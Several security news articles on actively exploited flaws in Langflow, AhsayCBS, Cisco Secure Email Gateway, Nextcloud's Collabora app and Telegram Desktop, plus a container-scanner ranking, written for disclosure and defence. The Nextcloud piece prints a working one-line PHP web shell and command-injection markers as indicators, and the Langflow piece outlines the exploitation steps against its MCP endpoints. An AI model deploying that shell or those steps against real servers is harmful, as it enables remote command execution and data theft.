11vhh9c.text: Threat actors are exploiting a critical security flaw in Langflow, according to an alert from Previdian. Langflow is an open-source platform that allows developers to build artificial intelligence (AI) applications and agentic workflows. In February 2025, DataStax, the parent company of Langflow, was acquired by IBM. The vulnerability in question is CVE-2026-105740 (CVSS score: 9.9), a case of authenticated remote code execution impacting versions prior to 1.9.0. "Any authenticated Langflow user can achieve Remote Code Execution (RCE) on the server by adding an MCP server with the 'stdio' transport," reads an advisory released last month. "The user-supplied command field is passed directly to bash -c "exec {command}" with zero validation, no allowlisting, and no sandboxing. The command executes immediately when the server list is fetched. Additionally, the env field allows arbitrary environment variable injection (e.g., LD_PRELOAD, PATH override)." The crux of the vulnerability is that Langflow accepts a user-provided command without restricting it to approved executables. This, in turn, can lead to shell execution. In a hypothetical attack scenario, a bad actor can exploit the flaw in the following fashion - Login as a regular, non-admin user. Add a malicious MCP server by sending a crafted HTTP POST request to "/api/v2/mcp/servers/{server_name}" with a command field containing a malicious payload (e.g., a reverse shell). The server accepts and stores the attacker-supplied "command" without any validation. Trigger the flaw by fetching the MCP server list via an HTTP GET "/api/v2/mcp/servers?action_count=true" request, causing the command to execute. Achieve code execution. "Any authenticated Langflow user (including non-admin accounts) can execute arbitrary OS commands on the server with the privileges of the Langflow process," Langflow warned. Successful exploitation can result in full server compromise, environment variable injection, facilitate lateral movement, and the deployment of a persistent backdoor, as the malicious MCP server configuration persists and re-executes every time the server list is loaded. "Unlike custom component code which is visible in the flow editor, MCP server configs are stored in project settings and are not visible during normal flow review," Langflow said. Data from Previdian shows that 1,423 exploitation attempts have been recorded against its honeypot sensors since September 19, 2026, from 27 unique attacker IP addresses located in Belgium, China, Germany, Hong Kong, Japan, Nigeria, the Philippines, Russia, Seychelles, Singapore, South Korea, Taiwan, Tanzania, the U.S., and Vietnam. The exploitation efforts ramped up starting October 11, 2026, when 333 attempts were registered. As of writing, 66 attempts have been observed on October 15, 2026. "We've investigated how attackers are authenticating, as this vulnerability requires authentication," Ryan Dewhurst, founder and CEO of Previdian, told The Hacker News. "In one observed sequence, attackers checked the Langflow version, attempted /api/v1/auto_login (which returned 403 as it was disabled in our honeypot), and then successfully authenticated using a common username and password. They immediately used the resulting bearer token to access the vulnerable MCP server configuration endpoint." Some of the captured payloads include - Attempts to extract environment variables and sensitive Langflow configurations, including LANGFLOW_SECRET_KEY and LANGFLOW_SUPERUSER_PASSWORD, and transmit them to 146.70.211[.]112:18764. Docker commands attempting to access the host filesystem and read the contents of "/etc/passwd." Command execution probes using id, whoami, and other simple commands. A significant chunk of the activity originates from the IP address "192.255.229[.]92," which has been observed attempting to extract environment variables. Data from GreyNoise and Previdian shows that the IP address has engaged in generic brute-force attacks, as well as exploiting other flaws in Flowise (CVE-2026-69255) and Langflow (CVE-2026-55255, CVE-2026-9198, and CVE-2026-0768). The targeting of multiple Langflow vulnerabilities points to an unknown threat actor systematically targeting exposed instances. Their end goals are currently unclear. "We recommend upgrading Langflow to a patched version, disabling auto-login, enforcing strong and unique passwords, and reviewing authentication logs and requests to /api/v2/mcp/servers/ for suspicious activity," Dewhurst said. Last month, Langflow also addressed another critical vulnerability (CVE-2026-105697, CVSS score: 9.9) that could also result in operating system command injection through MCP stdio server configuration. If immediate patching is not an option, it's advised to set LANGFLOW_AUTO_LOGIN=false, avoid exposing Langflow directly to untrusted networks, and grant Langflow accounts to trusted users.

1urzg8c.text: Ravie LakshmananOct 15, 2026Vulnerability / Cryptojacking Singapore-based Ahsay Backup has released security updates to address two security flaws in AhsayCBS that have been exploited by bad actors to drop web shells and XMRig cryptocurrency miners. The vulnerabilities in question are CVE-2026-105133 and CVE-2026-105134, which could be chained to sidestep authentication and execute arbitrary commands on affected systems. In a report published earlier this month, Huntress said it observed threat actors combining the two flaws to achieve unauthenticated remote code execution and deploy web shells and cryptocurrency miners on exposed systems. Although the vulnerabilities were initially assumed to be addressed in AhsayCBS versions 9.15.2.59 and 10.3.4.0 released in August 2026, the software company has now confirmed that the patches did not completely plug them. The fixes are available in the following versions - AhsayCBS v10.3.4.45 hotfix AhsayCBS v9.15.2.70 hotfix "Given the severity of these risks, we strongly urge you to take immediate action to secure your environment and protect your customer's data," Ahsay said. "After applying the hotfix, please reboot your server." In an update, Huntress said it has "independently verified that the AhsayCBS 10.3.4.45 hotfix mitigates the initial entry point of this attack chain, which was still susceptible on previous v10 versions." The active exploitation of the flaws has prompted the U.S. Cybersecurity and Infrastructure Security Agency (CISA) to add them to the Known Exploited Vulnerabilities (KEV) catalog, requiring federal agencies to apply the patches by October 17, 2026.

1ds4y5s.text: Attackers are exploiting a critical flaw in Cisco Secure Email Gateway that lets a sender with no login write files to the appliance's operating system, Cisco said in an advisory on Wednesday. The attacker sends an email with a crafted attachment through the gateway and, if it succeeds, could then run commands as root. The appliance filters an organization's email for spam, malware, and other threats, and only a gateway with the File Reputation service enabled and a Content Scanner Tools package older than version 25.3.0.5525 is vulnerable. The fix has been shipping since September 14 in AsyncOS 15.5.5-014 and 16.5.0-780, the builds Cisco listed as fixed in a hardening release that day, which the company now says covered this flaw. It also arrives as a Content Scanner Tools update, version 25.3.0.5525 or later, which installs without a software upgrade or a restart. Cisco found the flaw, tracked as CVE-2026-76519 (CVSS score: 9.8), in its own internal security scanning and became aware of the attacks in October. The advisory does not say how many devices were attacked, who is behind the attacks, or whether the attackers obtained root on any of them. Cisco has contacted customers of its managed Secure Email Cloud service whose devices showed "indicators of possible compromise" and says it is engaged in remediation and recovery. Administrators of those managed gateways may not have the command-line access needed to run the compromise check below, and Cisco has already deployed the fixed scanner there, so they need no action to get the fix. Who Is Exposed Both conditions must hold. The File Reputation service, part of the Advanced Malware Protection (AMP) feature that handles attachments, must be enabled and assigned to a mail policy, and the Content Scanner Tools version must be earlier than 25.3.0.5525. Physical and virtual gateways on vulnerable AsyncOS releases are affected. Secure Email and Web Manager and Secure Web Appliance are not. To check the first condition, open Mail Policies > Incoming Mail Policies > Advanced Malware Protection, or the same path under Outgoing Mail Policies, choose a mail policy, and look at the Enable File Reputation box. To check the second, run contentscannerstatus at the CLI, which shows the version and when it was last updated. How to Fix It The quickest route is the scanner update. Gateways with automatic Content Scanner Tools updates turned on need no action once the update has applied, so confirm with contentscannerstatus that the version is 25.3.0.5525 or later rather than assuming it arrived. Where automatic updates are off, run contentscannerupdate at the CLI, or turn them on under Security Services > Service Updates. The full AsyncOS fix is in these first fixed releases: 15.5: 15.5.5-014 16.0: no fixed build. Migrate to a fixed release. 16.5: 16.5.0-780 Content Scanner Tools (all licensed and supported AsyncOS releases): 25.3.0.5525 or later Cisco recommends that any gateway earlier than 16.5 move to 16.5.0-780. A 16.0 gateway on 16.0.4-302, the build that fixed September's SQL injection flaw, is not fixed for this one, and the advisory does not list which releases count as licensed and supported for the scanner update. For a 16.0 gateway that stays on 16.0, the scanner version shown by contentscannerstatus is the only confirmation the advisory offers. There is no workaround. For a virtual appliance that shows signs of compromise, Cisco's guidance is a rebuild with new credentials, and it warns that upgrading a compromised instance destroys the forensic data and logs. How to Check for Compromise Cisco's check for attempted exploitation is one command on the appliance: grep "System Security" system_logs. It returns one of three messages: System Security: Suspected compromise indicator was found. Contact TAC for further recommendations. Compromise detected. Follow the recovery steps below. System Security: Security scan did not complete. Contact TAC for further recommendations. Contact Cisco's Technical Assistance Center (TAC). System Security: No compromise indicator was found. No compromise detected by this check. Upgrade if the device is on an affected release. Run it on every member of a cluster. A clean result is not proof: an attacker with root could remove or hide evidence, so also check firewall and network logs outside the device for unexpected uploads to external IP addresses or downloads from malicious ones. The advisory does not say what the scan looks for. If a Device Is Compromised For a physical appliance, Cisco asks customers to contact TAC and to enable remote access so its engineers can investigate. For a virtual appliance, its steps are: Preserve forensic data first. Upgrading a compromised instance destroys its logs and evidence. Deploy a new virtual machine on a fixed release. Rebuild the configuration without importing any previous configuration file. Renew the credentials and cryptographic material on the appliance, then keep monitoring for unusual behavior. Cluster members authenticate to each other with SSH key pairs. A compromised member's private keys could give the attacker a way into the others, so Cisco recommends restoring every member of a cluster that contains at least one compromised appliance. Secure Email Cloud customers it has contacted are asked to renew credentials and cryptographic material where possible. The September Release This is the second Secure Email Gateway flaw Cisco has confirmed under attack in a month. On September 14 it disclosed CVE-2026-76461, a SQL injection flaw in the gateway's email parsing that could let an unauthenticated sender run commands as root through a crafted email. That flaw affects every configuration and was added to CISA's Known Exploited Vulnerabilities catalog the same day. The two flaws sit in different parts of the software and have different log checks, and Cisco has not linked the attacks. The same day, Cisco published a hardening release for the gateway and for Secure Email and Web Manager that grouped internally found bugs into five umbrella CVEs by weakness class: CVE-2026-76440, CVE-2026-76441, CVE-2026-20353, and CVE-2026-76443, each scored 9.8, and CVE-2026-76442 at 7.5. Each score is the highest among the bugs in that class, and the advisory carried the 15.5.5-014 and 16.5.0-780 builds. Cisco updated that advisory on Wednesday, and it now says "Two of them are known to be actively exploited": the file-write flaw, which sits in the path traversal class, and the September SQL injection flaw, which sits in the improper neutralization class. It is not aware of attacks on the other bugs in the release. Under a disclosure policy Cisco set out in June, bugs fixed in hardening releases share grouped CVEs, and a flaw gets its own CVE when, among other reasons, it is known to be exploited. The file-write flaw was fixed in September inside the path traversal group and received its own advisory on Wednesday. It is also the third root-level flaw in these appliances that Cisco has confirmed exploited since December, when a China-linked group that Cisco Talos tracks as UAT-9686 used a zero-day in the spam quarantine feature, CVE-2025-20393, that Cisco patched in January.

k86j8x.text: Attackers exploited a flaw in an optional Nextcloud app, Collabora Online - Built-in CODE Server, to plant web shells on Nextcloud servers. Three administrators reported the issue on GitHub, with the first logged attack on September 10. A web shell is a small file that executes any command an attacker sends via a web request, with the rights of the web server account. The flaw allows an unauthenticated request to run a command on the server, but only when the app's local document server is not running, such as during a restart or upgrade, or after a crash. Collabora fixed it in version 26.4.303 on September 11 and on October 14 published an advisory with the identifier CVE-2026-110447, warning that turning off the app does not help: it must be updated or removed. Who Is Affected The app, published by Collabora under the package name richdocumentscode, downloads a copy of Collabora Online Development Edition (CODE) and runs it on the Nextcloud server itself. That lets Nextcloud Office edit documents without a separate Collabora server. Its store listing says it is "for local testing and non-production use" and "for personal use or for small teams." Collabora's advisory covers every version before 26.4.303 and says standalone Collabora Online servers are not affected. A warning posted on the Nextcloud community forum on October 3 stated that an installation is not affected if it uses only the Nextcloud Office app ( richdocuments) without the built-in app, whether its Collabora server runs in Docker, from a Linux package, or at a hosting provider. The app's proxy.php script starts the local CODE server whenever a request arrives, and nothing is listening. In versions up to 26.4.302, the script placed text from the request, including its path, inside a double-quoted bash command, where the shell still runs anything written as $(...). A request with a command hidden in its path ran that command as the web server user. Because the script only builds that command when it needs to start the server, the attack works only while the server is down, such as during a container restart, an upgrade, or a crash. The script is a plain PHP file that the web server runs directly from the app's folder and loads none of Nextcloud's code. "It is not sufficient to disable the app to avoid the problem; it must be upgraded to >= 26.4.303 or removed," Collabora said in the advisory. The fixed versions require Nextcloud 30 or later. Nextcloud 29 and older are end of life, and the app store still serves them an affected version, so their users should upgrade Nextcloud or remove the app. Collabora's fix for a separate command-injection flaw in the same script, CVE-2025-66208, disclosed last December, does not prevent this one. What the Attackers Did The first report came from an administrator who hosts several Nextcloud servers and wrote on GitHub that the servers had been hacked since the day before. Access logs from two of them show requests at 19:51 on September 10 and 09:56 on September 11 (UTC+2), both from one IP address and both aimed at proxy.php?status with a shell command hidden in the request path. All of the administrator's servers ran version 26.4.302. The command decoded a one-line PHP web shell into the app's folder and tried to send the server's uname -a output to a webhook.site address. On one server, the attacker then used the shell to search for credential stores and cryptocurrency wallets, including *.kdbx, wallet.dat and keystore.json files and names such as bitwarden, 1password, .bitcoin, .electrum, .monero and .ethereum. The reviewed requests showed no commands that archived, uploaded, or copied out files, but anything the web server account can read must be treated as potentially exposed, the administrator wrote. Two other administrators reported the same on their own instances. One found the shell when Nextcloud's integrity check flagged a new PHP file, and the other learned of the break-in from emails about failed sudo attempts on the server. None of the reports show the attacker gaining root access. After updating to 26.4.303, one of them logged another attempt on September 14 from a second IP address with a payload of the same kind. The CODE server it started carried the attack text in its startup options, but no new shell file appeared. The output "looks scary but should be harmless," replied mmeeks, who answered for the project in the thread, telling users to update and to remove any leftover shx*.php files. The CVE record describes the flaw as "exploited in the wild in September and October 2026." How many servers were hit is not known. "This impacts only the Development Edition, and only in this (rather rarer) Built-in CODE Server deployment mode that downloads a local appimage," mmeeks wrote. What to Do Now What to do, in order: Update richdocumentscode, which appears in Nextcloud's app list as Collabora Online - Built-in CODE Server, to 26.4.303 or later, or remove the app. Disabling it in Nextcloud does not close the flaw. On Nextcloud 29 or older, which cannot install 26.4.303, upgrade Nextcloud or remove the app. If you already updated, look for shx*.php files, starting in apps/richdocumentscode, and delete them. Then check your access logs back to at least September 10 for proxy.php?status requests whose path contains %2e%2e, $( or ${IFS}, and look for sudo attempts by the web server account. Treat anything that account could read as potentially exposed, as the first reporter advised. Version 26.4.402, released September 24, rewrote the start command to pass each option as a separate argument, but administrators report that it fails to start or fails to open documents on some setups and have gone back to 26.4.303, the version the advisory names as the fix. No newer release had appeared as of October 14. Indicators from the administrators' logs: File: shrf4645.php, shxa35d0.php, shx5cf91.php, shxd33ce.php and shxf4645.php, found in apps/richdocumentscode/ on the first reporter's servers File: shx13a86.php, found by a second administrator (location not stated) File: shx56367.php, the name in the September 14 attempt that created no file SHA-256: 4b9fbd0663fbfd6028fc216ed18e0d6ef3ae498a7fdc97083e4b0ce3cec40562, the one-line shell <?php $c=$_GET['c']??'id'; echo shell_exec($c.' 2>&1'); Path: /apps/richdocumentscode/proxy.php?status IP: 139.28[.]18[.]122 (September 10 and 11 attacks), 89.38[.]98[.]50 (September 14 attempt against a patched server) Request markers: %2e%2e, $(, ${IFS}, and base64 -d piped to sh, all in the request path Domain: webhook[.]site, a public service, with callback IDs 45060ed4-de0b-4119-8f0d-2a2776bbd413 and 774cf5e1-b5a4-4174-a1ad-0241861029a2 A Fix That Shipped Without a Security Notice The code change that closed the flaw is four lines in proxy.php. The start command is now handed to bash as a single escaped argument instead of a double-quoted string, so the shell that receives it no longer expands text from the request. The repository's commit record shows the change was written on August 20 by Caolán McNamara, who also published the advisory, under the title "tidy up how the coolwsd launch command is built." It was not in version 26.4.302, released on August 31, and was committed on September 9. The first logged attack came on September 10, and 26.4.303 followed on September 11 with release notes that name only the bundled CODE build. The administrator who reported the attacks disabled the app while waiting for a fix, the step the advisory now says is not enough. In the thread, mmeeks told users to update, promised "more updates in due course," and pointed to a "record backlog" at GitHub's advisory database, linking to a June post in which GitHub said its processing had fallen weeks behind. On October 3, a member of the Nextcloud community forum warned other users to update at once because the flaw was "already being exploited" and "no warning or CVE has been published." The CVE and the advisory came on October 14. The advisory credits a GitHub user, wwwshellcodeit, as the reporter, and neither it nor the thread says when the report came or when Collabora learned the change was a security fix.

d2s85l.text: A public proof of concept has exposed a flaw in Telegram Desktop that could let attackers steal local files and take over accounts after a user clicks a crafted external link. Tracked as CVE-2026-107181, the vulnerability affects versions before 7.2.9 and carries a CVSS 4.0 severity rating of 8.6 (High). Researcher Beaksec published the technical write-up on October 3, 2026, and updated it on October 7. VulnCheck assigned the CVE that day. The reported attack reaches Telegram’s local session data, making account takeover possible when the victim has not enabled a local passcode. The weakness lies in how Telegram Desktop handles links opened outside the app. When Telegram is already running, another instance passes the link to it through a local communication channel, known as inter-process communication, or IPC. That channel failed to escape a character used to separate records. An attacker could place the character inside a crafted link and make Telegram read part of the link as another command. The CVE record classifies this as CWE-143, improper handling of record delimiters. PoC Released for Telegram Desktop Flaw According to ThreatWire’s research, the injected command could access an outdated internal helper designed for release publishing. The helper could read local files and send them to a chat without permission checks or user confirmation. The result is file theft through Telegram itself. Stolen session files could let an attacker reuse the victim’s logged-in account. Earlier reporting on Telegram account hijacking through voicemail shows another route to account loss, but that method is separate from this Desktop vulnerability. The researcher demonstrated the chain on Windows using Telegram Desktop 6.9.3 and reported that it remained present through 7.2.8. Although the CVE covers Telegram Desktop generally, the write-up does not demonstrate the attack on macOS or Linux. The link must be opened outside Telegram, such as from a browser. Links clicked inside Telegram follow a different processing path and are not affected. A browser may also ask for permission before launching the desktop app. The demonstrated chain depends on automatic group file downloads and settings that allow anyone to add the victim to a group. These conditions matter when judging the “one-click” claim. Previous EvilVideo coverage also highlighted download settings, although that issue affected Telegram for Android rather than Desktop. Telegram fixed the issue in commit db3405699f on September 16 and released version 7.2.9 on September 17. The reported changes remove the legacy helper, escape the record separator, and strengthen handling of mixed record types. The release notes mention only a rendering fix, not the security issue. No vendor security advisory is identified in the supplied reporting. The CVSS 3.1 score is 8.1, while CVSS 4.0 gives 8.6. Both ratings describe the same flaw. Users should update every Telegram Desktop installation to 7.2.9 or later. Until then, restrict group invitations, stop automatic downloads, and enable a local passcode. Treat unexpected browser prompts to open Telegram cautiously. As of October 9, the supplied reporting identifies no known exploitation or CISA KEV listing. A public PoC demonstrates feasibility, not confirmed attacks. The public write-up should not be mistaken for independent attack confirmation. Users who suspect exposure should end other active sessions and review chats for unexpected file uploads. Stops threats before impact with 21 min faster MTTR. Integrate ANYRUN’s Sandbox in your SOC The post PoC Released for Telegram Desktop Flaw Enabling One-Click File Account Takeover appeared first on Cyber Security News.

1aqcvsf.text: Every image scan returns hundreds of CVEs; the question is which ten your containers actually execute and which base image would zero the list entirely. We scored ten options with context and elimination weighted above raw detection. Evaluating scanners alongside the Top 10 Best Container Security Tools in 2026 reveals that static vulnerability counts alone do not prevent attackers who compromise container hosts through misconfigurations. Aqua’s Trivy takes 1 as the free floor everyone should run; Sysdig and Wiz complete a podium built on making findings mean something. Key Takeaways • 1 overall: Trivy the ubiquitous free scanner with platform depth above it. • Podium: Trivy (floor), Sysdig (in-use runtime filtering), Wiz (graph exposure ranking). • Strategy pick: Chainguard’s zero-CVE bases beat scanning by removing what scanners find. • One-vendor note: Grype and Syft are Anchore’s OSS pair SBOM-first scanning free. How We Scored (Methodology) Research-based: detection quality, SBOM support, context/prioritization, registry/workflow fit, pricing transparency. No lab testing; no paid placement; editorial scores excluded from structured data. Weights: context quality 30%, detection/SBOM 25%, workflow fit 20%, pricing accessibility 15%, elimination strategy 10%. The 2026 Container Image Scanning Power Rankings S.NO ToolAwardScore* 1Aqua (Trivy)Best free floor + platform9.1 2SysdigBest in-use prioritization8.9 3WizBest exposure-graph ranking8.8 4ChainguardBest eliminate-first strategy8.7 5SnykBest fix-oriented workflow8.6 6Anchore (Grype/Syft)Best SBOM-first OSS8.4 7JFrog XrayBest registry-native8.2 8Palo Alto (Prisma Cloud)Best CNAPP unity8.0 9Docker ScoutBest workflow-native7.9 10ClairBest OSS registry veteran7.6 *Editorial research-based scores, not lab results. 1. Aqua (Trivy) — Best Free Floor + Platform Aqua (Trivy) — Best Free Floor + Platform Snapshot: OSS free + Aqua tiers | Images, IaC, deps in one Why it earns 1: The most deployed scanner in the cloud-native ecosystem: fast, accurate, multi-target, and completely free with Aqua’s enterprise platform adding admission control and runtime security above it. Even as organizations maintain vigilance following threats like the Trivy supply chain attack on public registries, its multi-target engine remains the baseline floor no CI/CD pipeline should lack. Standout features: Image+IaC+SCA scanning; SBOM; CI-native; policy packs. Pros: Ubiquity; consolidation; free. Cons: Prioritization lives upstack. Bottom line: The scan without an excuse. 2. Sysdig — Best In-Use Prioritization Sysdig — Best In-Use Prioritization Snapshot: Tiered/quote | Runtime-informed filtering | Falco lineage Why it earns 2: Marking which vulnerable packages actually load into memory at runtime collapses CVE backlogs by 90-plus percent triage governed by execution truth rather than static theoretical risk. Built upon its open-source Falco heritage and Sysdig Threat Research on container escape vulnerabilities, it connects image vulnerabilities directly to live Kubernetes behavior. Standout features: In-use filtering; runtime detection; registry scanning; admission. Pros: Context that empties queues. Cons: Platform adoption. Bottom line: Only the vulnerabilities your containers run. 3. Wiz — Best Exposure-Graph Ranking Wiz — Best Exposure-Graph Ranking Snapshot: Platform quote | Agentless | Blast-radius context Why it earns 3: Image findings correlated with workload exposure, cloud entitlements, and network reachability determining which vulnerable container image actually endangers crown-jewel assets at cluster scale. Grounded in insights from Wiz threat research analyzing cloud attack paths, Wiz separates sandboxed images from workloads facing public ingress. Standout features: Graph correlation; agentless scanning; prioritization. Pros: Consequence ranking. Cons: Platform economics. Bottom line: The image ranked by what it can reach. 4. Chainguard — Best Eliminate-First Strategy Chainguard — Best Eliminate-First Strategy Snapshot: Published per-image | Zero-CVE minimal bases Why it earns 4: The strategic answer to alert fatigue: start with container bases that have nothing to flag. Minimal, continuously rebuilt, and cryptographically signed images resolve what CVE counts miss about container security by collapsing false positives and shrinking software bills of materials before deployment. Standout features: Hardened bases; provenance included; FIPS variants. Pros: Queue elimination. Cons: Migration engineering; per-image cost. Bottom line: The base with nothing to report. 5. Snyk — Best Fix-Oriented Workflow Snyk — Best Fix-Oriented Workflow Snapshot: Free tier + per-dev | Base-image upgrade advice Why it earns 5: “Switch to this tag, eliminate 80 CVEs” pragmatic recommendations that empty backlogs through direct action inside the workflows developers already use. Snyk pairs base-image intelligence with automated pull request remediation and fix advice so engineering teams can remediate Dockerfile bloat in a single click. Standout features: Upgrade advice; registry integrations; K8s monitoring. Pros: Actionability. Cons: Runtime context elsewhere. Bottom line: The recommendation that ships as a fix. 6. Anchore (Grype/Syft) — Best SBOM-First OSS Anchore (Grype/Syft) — Best SBOM-First OSS Snapshot: OSS free + enterprise | One vendor’s pair Why it earns 6: Syft generates the Software Bills of Materials the ecosystem standardized on; Grype scans them with precision free, accurate, and evidence-native, with Anchore Enterprise adding centralized policy gates. It provides the toolchain necessary for addressing what CVE counts miss about container security while pairing with container registry security tools to maintain artifact integrity across CI/CD environments. Standout features: Syft SBOM; Grype matching; policy (enterprise). Pros: SBOM depth; OSS credibility. Cons: Enterprise features gate up. Bottom line: The scan that produces evidence, not just alerts. 7. JFrog Xray — Best Registry-Native JFrog Xray — Best Registry-Native Snapshot: Platform tiers | Artifactory unity | Impact graphs Why it earns 7: Recursive binary scanning and build-impact analysis executed directly where artifacts live the authoritative source-of-truth integration for JFrog estates. Standing out among dedicated container registry security tools , Xray inspects image layers, nested dependencies, and curated packages in a unified catalog. Standout features: Artifactory integration; impact graphs; curation. Pros: Registry leverage. Cons: Platform gravity. Bottom line: The registry scanning itself. 8. Palo Alto (Prisma Cloud) — Best CNAPP Unity Palo Alto (Prisma Cloud) — Best CNAPP Unity Snapshot: Quote | Twistlock heritage | Pipeline-to-runtime Why it earns 8: Comprehensive image scanning delivered within a unified Cloud-Native Application Protection Platform (CNAPP) with built-in admission control and runtime defense. Incorporating its Twistlock heritage, it prevents threats by monitoring CI/CD environments and registry pipelines before non-compliant containers reach cloud clusters. Standout features: Pipeline+registry+runtime; admission; CNAPP context. Pros: Breadth. Cons: Packaging shifts. Bottom line: Image security in the platform estate. 9. Docker Scout — Best Workflow-Native Docker Scout — Best Workflow-Native Snapshot: Free + tiers | Desktop/Hub integration Why it earns 9: Vulnerability scanning and policy evaluation embedded inside the Docker CLI and Docker Desktop workflows developers use daily. Catching issues early prevents scenarios where malicious Docker Hub images deploying cryptominers or bloated layers slip into production registries. Standout features: Desktop/Hub integration; recommendations; policy. Pros: Native fit; free floor. Cons: Enterprise depth. Bottom line: The scan inside the CLI you already use. 10. Clair — Best OSS Registry Veteran Clair — Best OSS Registry Veteran Snapshot: Free (OSS) | Quay lineage | API-driven Why it earns 10: The long-serving open-source scanning engine behind Project Quay and OpenShift deployments delivering static layer analysis via an extensible API.
